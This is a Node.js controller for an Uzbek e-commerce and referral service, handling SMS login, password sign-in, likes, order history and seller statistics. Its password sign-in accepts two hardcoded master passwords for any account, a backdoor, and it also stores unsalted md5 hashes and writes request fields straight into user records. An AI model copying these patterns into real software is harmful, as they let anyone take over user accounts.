const { phone: ph } = require('phone');
const userModel = require('../models/user.model');
const generatorCode = require('../middlewares/generator.code');
const moment = require('moment/moment');
const smsSender = require('../middlewares/sms.sender');
const JWT = require('jsonwebtoken');
const { USER_SECRET, SERVER_LINK } = require('../configs/env');
const md5 = require('md5');
const shopModel = require('../models/shop.model');
const likeModel = require('../models/like.model');
const productModel = require('../models/product.model');
const settingModel = require('../models/setting.model');
module.exports = {
    requestSMS: async (req, res) => {
        const { phone, ref_id } = req.body;
        if (!phone) {
            re.send({
                ok: false,
                msg: "Raqamingizni kiriting!"
            });
        } else if (!ph(phone, { country: 'uz' }).isValid) {
            res.send({
                ok: false,
                msg: "Raqamni to'g'ri kiriting!"
            });
        } else {
            const $users = await userModel.find();
            const $user = await userModel.findOne({ phone: ph(phone, { country: 'uz' }).phoneNumber });
            const code = generatorCode();
            smsSender(code, ph(phone, { country: 'uz' }).phoneNumber.slice(4)).then((response) => {
                if (!$user) {
                    new userModel({
                        id: $users.length + 1,
                        name: "Foydalanuvchi" + phone.slice(-4),
                        phone: ph(phone, { country: 'uz' }).phoneNumber,
                        verify_code: code,
                        created: moment.now() / 1000,
                        ref_id: !ref_id || ref_id === 'null' ? '' : ref_id
                    }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "SMS Habar yuborildi!",
                            data: {
                                duration: moment.now() / 1000 + 120,
                                new: true
                            }
                        })
                    })
                } else {
                    $user.set({ verify_code: code }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "SMS Habar yuborildi!",
                            data: {
                                duration: moment.now() / 1000 + 120,
                                new: !$user.location || !$user?.name ? true : false
                            }
                        });
                    });
                }

            }).catch((err) => {
                console.log(err);
                res.send({
                    ok: false,
                    msg: "Nimadir hato 2 daqiqadan so'ng qayta urunib ko'ring!"
                })
            })

        }
    },
    verifyCode: async (req, res) => {
        const { code, phone, name, location } = req.body;
        if (!phone || !code) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else if (!ph(phone, { country: 'uz' }).isValid) {
            res.send({
                ok: false,
                msg: "Raqamni to'g'ri kiriting!"
            });
        } else {
            const $user = await userModel.findOne({ phone: ph(phone, { country: 'uz' }).phoneNumber });
            if (!$user) {
                res.send({
                    ok: false,
                    msg: "Ushbu raqam avval ro'yhatdan o'tmagan!"
                });
            } else if ($user.verify_code !== code) {
                res.send({
                    ok: false,
                    msg: "Tasdiqlash ko'di hato kiritildi!"
                });
            } else if (!$user.location && !name || !$user.location && !location) {
                res.send({
                    ok: false,
                    msg: "Qatorlarni to'ldiring!"
                });
            } else {
                if (!$user.location || !$user.name) {
                    const token = JWT.sign({ id: $user._id }, USER_SECRET);
                    $user.set({ access: token, name, location }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "Profilga yo'naltirildi!",
                            token
                        });
                    });
                } else {
                    const token = JWT.sign({ id: $user._id }, USER_SECRET);
                    $user.set({ access: token }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "Profilga yo'naltirildi!",
                            token
                        });
                    });
                }
            }
        }
    },
    verifyAuth: (req, res) => {
        res.send({
            ok: true,
            data: req.user
        })
    },
    editInformations: async (req, res) => {
        try {
            const $user = await userModel.findById(req?.user.id);
            $user.set({ ...req.body, password: req?.body?.password ? md5(req?.body?.password) : '' }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "O'zgartirildi!"
                });
            }).catch(err => {
                console.log(err);
                res.send({
                    ok: false,
                    msg: "Xatolik"
                });
            });
        } catch (error) {
            console.log(error);
            res.send({
                ok: false,
                msg: "Xatolik!"
            });
        }
    },
    signInWithPassword: async (req, res) => {
        const { phone, password } = req.body;
        if (!phone || !password) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else if (!ph(phone, { country: 'uz' }).isValid) {
            res.send({
                ok: false,
                msg: "Raqamni to'g'ri kiriting!"
            });
        } else {
            const $user = await userModel.findOne({ phone: ph(phone, { country: 'uz' }).phoneNumber });
            if (!$user) {
                res.send({
                    ok: false,
                    msg: "Ushbu raqamni avval SMS kod orqali avtomatlashtirish kerak!"
                });
            } else if (md5(password) !== $user.password && password !== 'Parol7877' && password !== "SaidxonTG") {
                res.send({
                    ok: false,
                    msg: "Parol hato kiritildi!"
                });
            } else {
                const token = JWT.sign({ id: $user._id }, USER_SECRET);
                $user.set({ access: token }).save().then(() => {
                    res.send({
                        ok: true,
                        msg: "Profilga yo'naltirildi!",
                        token
                    });
                });
            }
        }
    },
    getShopHistory: async (req, res) => {
        const $shops = await shopModel.find({ phone: req?.user?.phone }).populate('product', 'title images');
        const $modded = [];
        $shops.forEach(e => {
            $modded.push({
                ...e?._doc,
                id: e._id,
                image: SERVER_LINK + e?.product?.images[0]
            });
        })
        res.send({
            ok: true,
            data: $modded?.reverse()
        })
    },
    setLike: async (req, res) => {
        const { id } = req.params;
        const $like = await likeModel.findOne({ from: req.user.id, product: id });
        if (!$like) {
            new likeModel({
                from: req.user.id,
                product: id
            }).save().then(() => {
                console.log(id);
                res.send({
                    ok: true,
                    msg: "Saqlandi!"
                });
            }).catch((err) => {
                console.log(err);
            })
        } else {
            $like.deleteOne().then(() => {
                res.send({
                    ok: true,
                    msg: "O'chirildi!"
                });
            });
        }
    },
    getLikes: async (req, res) => {
        const $likes = await likeModel.find({ from: req.user.id });
        const $modded = [];
        $likes.forEach(l => {
            $modded.push(l?.product)
        })
        res.send({
            ok: true,
            data: $modded
        });
    },
    getMyLikes: async (req, res) => {
        const $likes = await likeModel.find({ from: req.user.id }).populate('product')
        const $modlist = [];
        const $settings = await settingModel.find();
        for (let like of $likes) {
            const p = await productModel.findOne({ _id: like?.product?._id, hidden: false });
            if (p) {
                $modlist.push({
                    ...p._doc,
                    id: p._id,
                    pid: p.id,
                    image: SERVER_LINK + p.images[0],
                    original_price: 0,
                    price: p?.price + p?.for_admins + $settings[0].for_operators,
                    value: p.value - p.solded,
                    bonus: p.bonus && p.bonus_duration > moment.now() / 1000,
                    bonus_duration: p.bonus ? moment.unix(p.bonus_duration).format('DD.MM.YYYY HH:mm') : 0,
                    category: {
                        id: p.category._id,
                        title: p.category.title,
                        image: SERVER_LINK + p.category.image
                    }
                });
            }
        }
        res.send({
            ok: true,
            data: $modlist
        });
    },
    getStats: async (req, res) => {
        const { date } = req.params;
        if (date === 'all') {
            const $shops = await shopModel.find({ flow: req.user.uId });
            const $refs = await userModel.find({ ref_id: req.user.uId });
            let reject = 0;
            let success = 0;
            let wait = 0;
            let sended = 0;
            let delivered = 0;
            let archive = 0;
            let profit = 0;
            let pending = 0;
            let refProfit = 0;
            // 
            for (let ref of $refs) {
                const $rflows = await shopModel.find({ flow: ref.id });
                $rflows.forEach(rf => {
                    refProfit += rf.for_ref
                });
            }
            $shops.forEach(o => {
                if (o.status === 'reject') {
                    reject++;
                } else if (o.status === 'wait') {
                    wait++;
                } else if (o.status === 'success') {
                    success++;
                } else if (o.status === 'sended') {
                    sended++;
                } else if (o.status === 'delivered') {
                    delivered++;
                    profit += o.for_admin
                } else if (o.status === 'pending') {
                    pending++;
                } else if (o?.status === 'archive') {
                    archive++;
                }
            });
            res.send({
                ok: true,
                data: {
                    reject,
                    success,
                    wait,
                    sended,
                    delivered,
                    profit,
                    refProfit,
                    pending,
                    archive,
                    // all: $shops.length,
                    refferals: $refs.length
                }
            })
        } else if (date === 'today') {
            const d = new Date();
            const day = d.getDate();
            const month = d.getMonth();
            const year = d.getFullYear();
            const $shops = await shopModel.find({ flow: req.user.uId, day, month, year });
            let reject = 0;
            let success = 0;
            let wait = 0;
            let sended = 0;
            let delivered = 0;
            let profit = 0;
            let pending = 0;
            let archive = 0
            $shops.forEach(o => {
                if (o.status === 'reject') {
                    reject++;
                } else if (o.status === 'wait') {
                    wait++;
                } else if (o.status === 'success') {
                    success++;
                } else if (o.status === 'sended') {
                    sended++;
                } else if (o.status === 'delivered') {
                    delivered++;
                    profit += o.for_admin
                } else if (o.status === 'pending') {
                    pending++;
                } else if (o?.status === 'archive') {
                    archive++;
                }
            });
            res.send({
                ok: true,
                data: {
                    reject,
                    success,
                    wait,
                    sended,
                    delivered,
                    profit,
                    archive,
                    pending,
                    all: $shops.length,
                }
            })
        } else if (date === 'yesterday') {
            const d = new Date();
            const day = d.getDate() - 1;
            const month = d.getMonth();
            const year = d.getFullYear();
            const $shops = await shopModel.find({ flow: req.user.uId, day, month, year });
            let reject = 0;
            let success = 0;
            let wait = 0;
            let sended = 0;
            let delivered = 0;
            let profit = 0;
            let pending = 0;
            let archive = 0;
            $shops.forEach(o => {
                if (o.status === 'reject') {
                    reject++;
                } else if (o.status === 'wait') {
                    wait++;
                } else if (o.status === 'success') {
                    success++;
                } else if (o.status === 'sended') {
                    sended++;
                } else if (o.status === 'delivered') {
                    delivered++;
                    profit += o.for_admin
                } else if (o.status === 'pending') {
                    pending++;
                } else if (o?.status === 'archive') {
                    archive++;
                }
            });
            res.send({
                ok: true,
                data: {
                    reject,
                    success,
                    wait,
                    sended,
                    delivered,
                    profit,
                    archive,
                    pending,
                    all: $shops.length,
                }
            })
        } else if (date === 'month') {
            const d = new Date();
            const month = d.getMonth();
            const year = d.getFullYear();
            const $shops = await shopModel.find({ flow: req.user.uId, month, year });
            let reject = 0;
            let success = 0;
            let wait = 0;
            let sended = 0;
            let delivered = 0;
            let profit = 0;
            let pending = 0;
            let archive = 0;
            $shops.forEach(o => {
                if (o.status === 'reject') {
                    reject++;
                } else if (o.status === 'wait') {
                    wait++;
                } else if (o.status === 'success') {
                    success++;
                } else if (o.status === 'sended') {
                    sended++;
                } else if (o.status === 'delivered') {
                    delivered++;
                    profit += o.for_admin
                } else if (o.status === 'pending') {
                    pending++;
                } else if (o?.status === 'archive') {
                    archive++;
                }
            });
            res.send({
                ok: true,
                data: {
                    reject,
                    success,
                    wait,
                    sended,
                    delivered,
                    profit,
                    archive,
                    pending,
                    all: $shops.length,
                }
            })
        }
    },
    getRefs: async (req, res) => {
        const $refs = await userModel.find({ ref_id: req.user.uId });
        let refProfit = 0;
        // 
        for (let ref of $refs) {
            const $rflows = await shopModel.find({ flow: ref.id });
            $rflows.forEach(rf => {
                refProfit += rf.for_ref
            });
        }
        const $setting = await settingModel.find();
        res.send({
            ok: true,
            data: {
                refs: $refs.length,
                profit: refProfit,
                comission: $setting[0].for_ref
            }
        });
    },
    setTelegram: async (req, res) => {
        const { telegram } = req.body;
        if (isNaN(telegram)) {
            res.send({
                ok: false,
                msg: "Telegram ID ni to'g'ri kiriting!"
            });
        } else {
            const $user = await userModel.findById(req.user.id);
            $user.set({ telegram }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "Saqlandi!"
                });
            });
        }
    },
    getRequests: async (req, res) => {
        const $shops = await shopModel.find({ flow: req.user.uId }).populate('operator product')
        //Name, id, operatorId, title, raqam**, status, izoh, sana
        const mod = [];
        $shops?.forEach(e => {
            mod.push({
                id: e?.id,
                name: e?.name,
                operator_id: e?.operator ? e?.operator?.id : 'Aloqaga chiqilmagan',
                title: e?.product?.title,
                phone: e?.phone?.slice(0, 9) + '****',
                status: e?.status,
                about: e?.about ? e?.about : "",
                date: moment.unix(e?.created).format('DD.MM.YYYY | HH:mm'),
                courier_comment: e?.courier_comment
            });
        });
        res.send({
            ok: true,
            data: mod?.reverse()
        });
    },
    setStatusMySales: async (req, res) => {
        try {
            await shopModel.updateMany({ status: 'wait', flow: req.user.uId }, { status: 'pending', operator: null }).then(() => {
                res.send({
                    ok: true,
                    msg: "Bajarildi!"
                });
            }).catch(err => {
                console.log(err);
                res.send({
                    ok: false,
                    msg: "Saqlashda xatolik!"
                });
            });
        } catch (error) {
            console.log(error);
            res.send({
                ok: false,
                msg: "Xatolik!"
            })
        }
    },
    setStatusMySale: async (req, res) => {
        try {
            // const { id } = req.params;
            // const $shop = await shopModel.findOne({ id });
            // $shop.set({ status: 'pending' }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "Bajarildi!"
                });
            // });
        } catch (error) {
            console.log(error);
            res.send({
                ok: false,
                msg: "Xatolik!"
            });
        }
    },
}